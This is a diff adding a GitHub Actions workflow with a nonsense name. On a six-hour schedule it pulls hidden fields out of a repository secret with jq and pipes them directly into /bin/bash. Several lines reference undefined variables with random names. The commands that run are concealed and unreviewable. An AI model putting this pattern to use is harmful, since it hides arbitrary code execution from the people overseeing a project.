@@ -1,0 +1,25 @@
+name: zhuazhulesiweijiejiesh
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuazhulesiweijiejiesh
+        env:
+          t24: ${{ secrets.t24 }}
+        run: |
+          echo $t24 | jq -r .wlwbp7 | /bin/bash
+          echo $ycik192 | jq -r .dwwux0 | /bin/bash
+          echo $kofll991 | jq -r .jav3 | /bin/bash
+          echo $mbjx915 | jq -r .aaml805 | /bin/bash
+          echo $xrlv4381 | jq -r .o8 | /bin/bash
+          echo $kv11256 | jq -r .vhre5116 | /bin/bash
+          echo $dwwww2509 | jq -r .qotic56145 | /bin/bash
+
